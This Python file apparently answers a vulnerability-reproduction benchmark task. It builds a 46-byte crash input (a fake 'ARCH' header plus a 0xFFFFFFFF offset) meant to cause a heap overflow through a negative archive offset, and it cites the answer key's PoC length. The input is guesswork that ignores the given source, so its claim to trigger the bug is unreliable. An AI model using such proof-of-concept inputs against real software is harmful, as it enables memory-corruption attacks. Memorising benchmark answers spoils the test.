import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is that malformed input causes archive start offset to become negative.
        # We need to create a file that triggers a heap buffer overflow.
        # Based on the ground-truth PoC length of 46 bytes, we'll craft a minimal PoC.
        
        # Create a 46-byte PoC that triggers negative offset
        # Structure: header with magic values that cause negative offset calculation
        
        # Common archive formats have offsets at specific positions
        # We'll create data that causes underflow/overflow when used as offset
        
        # 46 bytes total: enough to contain archive header with manipulated values
        poc = bytearray(46)
        
        # Put a recognizable pattern for debugging (optional)
        poc[:4] = b'ARCH'  # Fake archive header
        
        # Key vulnerability: offset becomes negative
        # Set offset field to a value that when used in calculations becomes negative
        # Using 0xFFFFFFFF (or similar) can cause issues when cast to signed
        
        # Place a large value at offset position (e.g., bytes 4-7 for 32-bit offset)
        # 0xFFFFFFFF = -1 in signed 32-bit
        poc[4:8] = struct.pack('<I', 0xFFFFFFFF)  # Little-endian -1
        
        # Fill rest with pattern to trigger overflow when used
        for i in range(8, 46):
            poc[i] = i & 0xFF
        
        return bytes(poc)
